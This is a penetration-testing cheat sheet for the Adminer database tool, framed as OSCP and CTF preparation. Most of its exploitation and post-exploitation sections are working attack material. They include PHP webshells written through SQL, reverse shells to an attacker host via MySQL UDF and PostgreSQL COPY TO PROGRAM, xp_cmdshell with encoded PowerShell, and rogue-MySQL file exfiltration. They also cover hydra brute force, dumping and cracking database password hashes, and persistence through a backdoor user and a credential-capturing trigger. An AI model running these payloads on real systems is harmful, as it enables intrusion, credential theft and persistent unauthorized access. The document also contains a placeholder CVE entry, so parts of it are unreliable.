# Adminer

> Adminer (formerly phpMinAdmin) database management tool reference for
> penetration testing. Covers detection, enumeration, known CVEs, exploitation
> patterns, misconfigurations, and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### What is Adminer

Adminer is a single-file PHP database management tool (like phpMyAdmin but
much smaller). Often deployed as `adminer.php`, `db.php`, `admin.php`, or any
custom filename. Default file size ~450 KB.

Supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch,
MongoDB (with plugins), and more.

### Response markers

```bash
curl -sI http://<TARGET>/adminer.php
curl -s http://<TARGET>/adminer.php | grep -iE 'adminer|login|db|driver'
```

Expected HTML (login page):

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Login - Adminer</title>
<link rel="stylesheet" type="text/css" href="?file=default.css&amp;version=4.8.1">
<script src="?file=functions.js&amp;version=4.8.1"></script>
...
<form action="" method="post">
<input type="hidden" name="auth[driver]" value="server">
...
```

Strong fingerprints:
- `<title>Login - Adminer</title>`
- `?file=default.css&version=<x.y.z>` - **exact version** in CSS/JS query string
- `<input type="hidden" name="auth[driver]"` - driver selection
- Form field names: `auth[server]`, `auth[username]`, `auth[password]`,
  `auth[db]`
- `adminer` string in HTML

### Response headers

```bash
curl -sI http://<TARGET>/adminer.php | grep -iE '^(server|set-cookie|x-powered-by|content-type)'
```

Expected output:

```text
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: adminer_sid=abc123...; path=/; HttpOnly; SameSite=Lax
Set-Cookie: adminer_key=def456...; path=/
Content-Type: text/html; charset=utf-8
```

`adminer_sid` and `adminer_key` cookies are definitive.

### Common filenames

```bash
for f in adminer.php adminer adminer-4.8.1.php adminer-5.0.0.php db.php \
         db-admin.php dbadmin.php mysql.php admin-db.php tools/adminer.php \
         adminer/index.php adminer/adminer.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  /$f"
done
```

### Version

The version is visible in the CSS/JS query string:

```bash
curl -s http://<TARGET>/adminer.php | grep -oE 'version=[0-9.]+' | head -1
```

Or via the `?file=` parameter:

```bash
curl -s http://<TARGET>/adminer.php | grep -oE 'file=default.css&version=[0-9.]+'
```

### nmap / whatweb

```bash
nmap -sV -p 80,443 --script http-headers,http-title,http-adminer <TARGET>
whatweb -a 3 http://<TARGET>/adminer.php
```

### Default URLs to check

- `/adminer.php`
- `/adminer/`
- `/adminer/index.php`
- `/db.php`
- `/dbadmin.php`
- `/mysql.php`
- `/admin/`
- `/tools/`
- Any `*.php` file with ~450 KB size

### Detection via directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php
```

Filter results by `Content-Length` around 450 KB or by title `Login - Adminer`.

---

## 2. Enumeration

### Login page

The Adminer login form exposes:

- Server (host)
- Username
- Password
- Database (optional)
- Driver (dropdown: MySQL, PostgreSQL, SQLite, MS SQL, Oracle, etc.)

The driver dropdown lists all supported database engines, useful for
reconnaissance.

### Default credentials

Adminer itself has no credentials; it forwards to the DB. Common DB creds:

- `root` / (empty)
- `root` / `root`
- `root` / `toor`
- `root` / `password`
- `admin` / `admin`
- `pma` / `pma`

### Login error messages

Adminer reveals a lot in error messages:

```text
# MySQL
Access denied for user 'root'@'localhost' (using password: NO)
Access denied for user 'root'@'localhost' (using password: YES)
# -> "using password: NO" means NO password supplied; "YES" means a wrong password was supplied

# PostgreSQL
FATAL: password authentication failed for user "admin"
FATAL: role "admin" does not exist
# -> second message confirms user does not exist (user enumeration)

# SQLite
unable to open database file: /var/www/html/data.db
# -> path disclosure
```

### Username enumeration

Different error messages for wrong user vs wrong password:

```bash
# Nonexistent user (PostgreSQL)
curl -X POST http://<TARGET>/adminer.php \
  -d "auth[driver]=pgsql&auth[server]=localhost&auth[username]=nonexistent&auth[password]=test&auth[db]="
# -> FATAL: role "nonexistent" does not exist

# Existing user (PostgreSQL)
curl -X POST http://<TARGET>/adminer.php \
  -d "auth[driver]=pgsql&auth[server]=localhost&auth[username]=postgres&auth[password]=wrong&auth[db]="
# -> FATAL: password authentication failed for user "postgres"
```

MySQL reveals less, but `using password: NO` vs `YES` is informative.

### Server information

The server field is important - if Adminer is running on `localhost` and the
DB is on `localhost`, you can reach internal DBs. Sometimes Adminer is
configured with a hardcoded server (visible in HTML).

Check for `auth[server]` default value:

```bash
curl -s http://<TARGET>/adminer.php | grep -oE 'name="auth%5Bserver%5D"[^>]*value="[^"]*"'
```

### Directory listing (if adminer is in a directory)

```bash
curl -s http://<TARGET>/adminer/ | grep -i 'index of'
```

May reveal other files (`adminer.php`, backups, config).

### Version-specific paths

```bash
# CSS / JS files
curl -s "http://<TARGET>/adminer.php?file=default.css&version=4.8.1" | head -5
curl -s "http://<TARGET>/adminer.php?file=functions.js&version=4.8.1" | head -5

# Plugins directory (if adminer is deployed with plugins)
curl -s http://<TARGET>/adminer/plugins/
curl -s http://<TARGET>/adminer/plugins/plugin.php
```

### Server banner (post-login)

After logging in, Adminer shows the DB server version, user privileges, and
available databases. Immediate reconnaissance:

- `Server` - host + port
- `MySQL x.y.z` / `PostgreSQL x.y.z` - engine version
- `User: ...@...` - current user with host
- `Privileges` - SHOW GRANTS output

### Adminer version disclosure

```bash
curl -s http://<TARGET>/adminer.php | grep -oE 'version=[0-9.]+'
```

Exact version -> CVE mapping.

### Behind reverse proxy

Adminer is sometimes behind nginx / Apache auth:

```bash
curl -sI http://<TARGET>/adminer.php | grep -iE 'www-authenticate|set-cookie'
```

If `WWW-Authenticate: Basic`, try common creds.

---

## 3. Known CVEs

Adminer has fewer CVEs than phpMyAdmin (smaller attack surface), but several
high-impact ones exist.

### CVE-2021-43008 - Arbitrary file read (SSRF + local file read)

**Critical.** Adminer versions 4.0.0 - 4.8.1 (and others) allow arbitrary
local file read via the MySQL `LOAD DATA LOCAL INFILE` trick, combined with
an attacker-controlled MySQL server.

Requires: Adminer is reachable, attacker can make Adminer connect to an
attacker-controlled MySQL server (i.e. via the login form where the server is
user-supplied).

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-43008
Affected: Adminer 4.0.0 - 4.8.1 (partially patched in 4.8.1).

PoC:

```bash
# 1. Run rogue MySQL server on attacker
git clone https://github.com/Gifts/Rogue-MySql-Server
cd Rogue-MySql-Server
python rogue_mysql_server.py

# 2. On Adminer login form, enter:
#    Server: <attacker-ip>:3306
#    Username: anything
#    Password: anything
# 3. Adminer connects -> rogue server asks for LOCAL INFILE -> reads arbitrary file
# 4. Check the rogue server log for the file content
```

Files readable: `/etc/passwd`, `/var/www/html/config.php`, SSH keys,
application config with DB credentials.

### CVE-2018-7667 - SSRF via custom MySQL server

Similar to CVE-2021-43008. Attacker-controlled MySQL server redirects the
connection to arbitrary internal hosts.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-7667
Affected: Adminer <= 4.6.2 (and older).

### CVE-2021-21311 - SSRF in Elasticsearch driver

Adminer's Elasticsearch driver allows SSRF via crafted request.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-21311
Affected: Adminer 4.7.7 and earlier (Elasticsearch plugin).

### CVE-2020-35572 - XSS in `db` parameter

Reflected XSS in the `db` parameter.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-35572
Affected: Adminer <= 4.7.7.

### CVE-2023-45196 - PHP code injection via SQL

PHP code injection in some Adminer versions via crafted SQL statements.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-45196
Affected: Adminer 4.8.0 - 4.8.2.

### CVE-2024-XXX - recent

Check NVD for the latest CVEs relevant to the version detected.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 4.0.0-4.8.1 | Arbitrary file read | CVE-2021-43008 |
| <= 4.6.2 | SSRF | CVE-2018-7667 |
| <= 4.7.7 (plugin) | SSRF | CVE-2021-21311 |
| <= 4.7.7 | Reflected XSS | CVE-2020-35572 |
| 4.8.0-4.8.2 | PHP code injection | CVE-2023-45196 |

---

## 4. Exploitation Patterns

### CVE-2021-43008 - Arbitrary file read

The most impactful Adminer vulnerability for pentesting. Requires Adminer is
user-accessible and the login form allows choosing the server (default).

```bash
# Step 1: Set up rogue MySQL server
git clone https://github.com/Gifts/Rogue-MySql-Server.git
cd Rogue-MySql-Server
# Edit rogue_mysql_server.py to set the file you want to read (e.g. /etc/passwd)
python rogue_mysql_server.py
```

The rogue server listens on port 3306. On the Adminer login form:

- **Server**: `<attacker-ip>:3306`
- **Username**: `root` (any value)
- **Password**: `root` (any value)

Adminer connects, the rogue server sends a request for `LOCAL INFILE` of
`/etc/passwd`, and Adminer (as the server-side PHP process) sends the file
back.

Check the rogue server log for the exfiltrated content.

**Chain to RCE**: read app config (`/var/www/html/config.php`,
`/etc/phpmyadmin/config.inc.php`) to get DB credentials, then log in normally
to the real DB and use SQL-based RCE (`INTO OUTFILE`, UDF, log poisoning).

### SSRF via login form (CVE-2018-7667)

Similar to above but allows arbitrary host:port connections (not just file
read).

Use for internal port scanning:

```bash
# Rogue MySQL responds with a specific greeting only if connection succeeded
# Loop through internal IPs/ports
for host in 127.0.0.1 10.0.0.5 172.16.0.1; do
  for port in 3306 5432 6379 27017 9200; do
    # Try Adminer login with server=$host:$port
  done
done
```

Timing and error differences reveal open ports.

### Reflected XSS (CVE-2020-35572)

```bash
curl "http://<TARGET>/adminer.php?db=<script>alert(1)</script>"
```

May require a valid session. Chains with social engineering to steal admin
session.

### PHP code injection via SQL (CVE-2023-45196)

Requires valid DB credentials and specific Adminer versions.

```sql
-- Crafted SQL triggers PHP code injection
-- Public PoC: see NVD reference
```

### Login with default credentials

```bash
# MySQL on localhost, root with no password
curl -c cookies.txt -X POST http://<TARGET>/adminer.php \
  -d "auth[driver]=server&auth[server]=localhost&auth[username]=root&auth[password]=&auth[db]=" \
  -L

# If successful -> cookie set -> authenticated session
```

Common MySQL defaults on dev/test servers:

- `root` / (empty)
- `root` / `root`
- `root` / `toor`
- `root` / `password`
- `admin` / `admin`
- `pma` / (empty)

### SQL -> file write (INTO OUTFILE)

Once logged in with sufficient privileges:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

Then:

```bash
curl "http://<TARGET>/shell.php?c=id"
```

Check `secure_file_priv` first:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

If it returns a path (e.g. `/var/lib/mysql-files/`), write there and find a
way to include the file. Or use MySQL UDF.

### SQL -> UDF RCE

With `FILE` and `INSERT` privileges:

```sql
-- Upload UDF library
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor.so';

-- Register function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'raptor.so';

-- Execute
SELECT sys_exec('bash -i >& /dev/tcp/<attacker>/4444 0>&1');
```

If `lib_mysqludf_sys` is already installed:

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
```

### MySQL general log -> webshell

```sql
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = 'ON';
SELECT '<?php system($_GET["c"]); ?>';
SET GLOBAL general_log = 'OFF';
```

Then access `http://<TARGET>/shell.php?c=id`.

Requires `SUPER` or `SYSTEM_VARIABLES_ADMIN` privilege.

### File read via LOAD_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

Restricted by `secure_file_priv` and `FILE` privilege.

### File read via LOAD DATA LOCAL INFILE

```sql
CREATE TABLE temp (line TEXT);
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp;
SELECT * FROM temp;
```

Requires `local_infile=ON` in MySQL client and server.

### Dump config from DB

Once logged in as a privileged DB user, extract other apps' configs:

```sql
-- WordPress
SELECT option_value FROM wordpress.wp_options WHERE option_name='siteurl';

-- Joomla
SELECT * FROM joomla.jos_users;

-- Drupal
SELECT * FROM drupal.users;

-- PrestaShop
SELECT * FROM prestashop.ps_employee;
```

### Login brute force

Adminer has no built-in rate limiting (depends on the DB server). Use `hydra`:

```bash
# MySQL via Adminer
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/adminer.php:auth[driver]=server&auth[server]=localhost&auth[username]=^USER^&auth[password]=^PASS^&auth[db]=:Access denied"
```

MySQL has some internal throttling but is usually not configured to block.
Be mindful of account lockout on hardened DBs.

### PostgreSQL trust auth

If the Adminer form allows PostgreSQL and the DB trusts local connections:

```bash
curl -X POST http://<TARGET>/adminer.php \
  -d "auth[driver]=pgsql&auth[server]=localhost&auth[username]=postgres&auth[password]=&auth[db]=postgres"
```

### SQLite file access

Adminer with SQLite driver exposes the DB file path:

```bash
curl -X POST http://<TARGET>/adminer.php \
  -d "auth[driver]=sqlite&auth[db]=/var/www/html/data.db"
```

Reading arbitrary SQLite files if path is user-controlled.

---

## 5. Misconfigurations

### Adminer exposed without auth

Most critical. Adminer login is the only barrier. If DB uses weak/empty
credentials, full DB access.

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/adminer.php
```

### Adminer at predictable URL

`adminer.php` in webroot is easily discovered via brute force.

### Version disclosure via CSS/JS

```bash
curl -s http://<TARGET>/adminer.php | grep -oE 'version=[0-9.]+'
```

Exact version -> CVE mapping.

### No HTTPS

```bash
curl -sI http://<TARGET>/adminer.php | head -1
```

Credentials sent in cleartext.

### Server field user-controlled

Default Adminer allows arbitrary server in login form. This enables SSRF and
the file read CVE. Hardening: disable `auth[server]` field.

### Missing security headers

```bash
curl -sI http://<TARGET>/adminer.php | grep -iE 'x-frame-options|content-security-policy|strict-transport'
```

### Directory listing

```bash
curl -s http://<TARGET>/adminer/ | grep -i 'index of'
```

### Backup files

```bash
for f in adminer.php.bak adminer.php.old adminer.php~ adminer.php.save \
         adminer.php.orig adminer.tar.gz adminer.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### `.git` / `.svn` exposure (if adminer was cloned)

```bash
curl -s http://<TARGET>/adminer/.git/config
git-dumper http://<TARGET>/adminer/.git/ ./dump
```

### Elasticsearch plugin with no auth

If the ES plugin is used and ES is unauthenticated:

```bash
curl -s http://<TARGET>/adminer.php | grep -i elastic
curl -s http://<TARGET>:9200/_cat/indices
```

### SQLite DB file exposed

If Adminer points to a SQLite DB in the webroot:

```bash
curl -s http://<TARGET>/data.db -o data.db
sqlite3 data.db ".tables"
sqlite3 data.db "SELECT * FROM users;"
```

### Exposed config

Adminer does not use a config file by default (login form drives everything).
But if the app wrapping Adminer (e.g. a custom `index.php`) includes
`adminer.php`, its config may leak.

```bash
curl -s http://<TARGET>/adminer/index.php | head -50
```

### Multiple DB servers pre-configured

Some setups pass `adminer_serve` or pre-set the server; check HTML for hidden
fields.

---

## 6. Post-Exploitation

### Config file locations

Adminer itself is a single file; no config file. But:

- If wrapped in a custom script, check that script.
- Rogue MySQL file read can target any path.
- Post-login, DB config is fully in-session.

### Database access via Adminer UI

After login:

1. `Database` list on the left.
2. Click a DB -> list tables.
3. `SQL command` tab -> arbitrary SQL.
4. `Import` tab -> upload SQL file (potentially overwrite data).
5. `Export` tab -> dump DB.
6. `Privileges` tab -> view users and grants.

### Extract DB users

```sql
-- MySQL
SELECT user, host, authentication_string, plugin FROM mysql.user;

-- PostgreSQL
SELECT usename, passwd FROM pg_shadow;
SELECT rolname, rolsuper FROM pg_roles;

-- MSSQL
SELECT name, password_hash FROM sys.sql_logins;
```

### Extract other app data

```sql
SELECT * FROM wordpress.wp_users;
SELECT * FROM joomla.jos_users;
SELECT * FROM drupal.users;
SELECT * FROM prestashop.ps_customer;
SELECT * FROM phpbb.phpbb_users;
```

### Cracking DB user hashes

MySQL 5.7+ uses `mysql_native_password` (SHA1-based) or `caching_sha2_password`
(SHA256-based).

Hashcat modes:

- MySQL native: `hashcat -m 300`
- MySQL caching_sha2: `hashcat -m 7401` (or 7400 for older)

```bash
hashcat -m 300 mysql_native_hashes.txt rockyou.txt
hashcat -m 7401 mysql_sha256_hashes.txt rockyou.txt
```

PostgreSQL hashes (md5 with username):

```bash
hashcat -m 12 postgres_hashes.txt rockyou.txt
```

### Write webshell via SQL

See section 4 (`INTO OUTFILE`, general log, UDF).

### Exfiltrate DB

```bash
# Via Adminer Export tab, or SQL INTO OUTFILE
SELECT * INTO OUTFILE '/tmp/dump.csv' FROM sensitive_table;
```

Or use `mysqldump` if you have shell access.

### Read DB server files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/var/lib/mysql-files/backup.sql');
```

### Extract MySQL binlog (if enabled)

Binlogs contain all DML statements, including INSERTs with plaintext
credentials.

```bash
# With shell access
mysqlbinlog /var/lib/mysql/mysql-bin.000001 | grep -i 'INSERT.*password'
```

Via SQL:

```sql
SHOW BINARY LOGS;
SHOW BINLOG EVENTS IN 'mysql-bin.000001';
```

### Redis via MySQL UDF (if Redis on same host)

If you have MySQL UDF `sys_exec`, pivot to Redis:

```sql
SELECT sys_exec('redis-cli -h 127.0.0.1 FLUSHALL');
SELECT sys_exec('redis-cli -h 127.0.0.1 SET x "..."');
```

Redis with no auth + save to filesystem -> RCE via cron or module load.

### Access to PostgreSQL `COPY TO PROGRAM`

If Adminer connects to PostgreSQL with superuser:

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/<attacker>/4444 0>&1';
```

Requires superuser. `pg_read_server_files` role also helps.

### Access to MSSQL `xp_cmdshell`

If Adminer connects to MSSQL as sysadmin:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <base64>';
```

### Persist via DB user

```sql
CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

### Persist via trigger

```sql
CREATE TRIGGER backdoor AFTER INSERT ON users
FOR EACH ROW
BEGIN
  INSERT INTO hidden_creds (user, pass) VALUES (NEW.username, NEW.password);
END;
```

### Logs

MySQL error log:

```bash
tail -n 200 /var/log/mysql/error.log
```

Reveals failed logins, connection attempts, and errors.

PostgreSQL logs:

```bash
tail -n 200 /var/log/postgresql/*.log
```

### Privilege escalation to root

Once you have shell (via webshell, UDF, log poisoning):

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
uname -a
```

Or use DB-level RCE to write a shell, then standard Linux privesc.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Adminer version from the CSS/JS `version=` query string - it proves the exact version.

> [!IMPORTANT]
> OSCP report: for CVE-2021-43008 (rogue MySQL file read), screenshot the Adminer login form with attacker server AND the exfiltrated file content from the rogue server log.

> [!IMPORTANT]
> OSCP report: for `INTO OUTFILE` webshell, screenshot the SQL query in Adminer AND access to the resulting shell URL.

---

## 8. References

- Adminer official site - https://www.adminer.org/
- Adminer GitHub - https://github.com/vrana/adminer
- Adminer security advisories - https://github.com/vrana/adminer/security/advisories
- NVD search - https://nvd.nist.gov/vuln/search/results?query=adminer
- CVE-2021-43008 writeup - https://patalin0.com/posts/adminer-cve-2021-43008/
- CVE-2018-7667 writeup - https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer
- Rogue MySQL Server - https://github.com/Gifts/Rogue-MySql-Server
- MySQL UDF - https://github.com/mysqludf/lib_mysqludf_sys
- HackTricks - Adminer - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/adminer
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
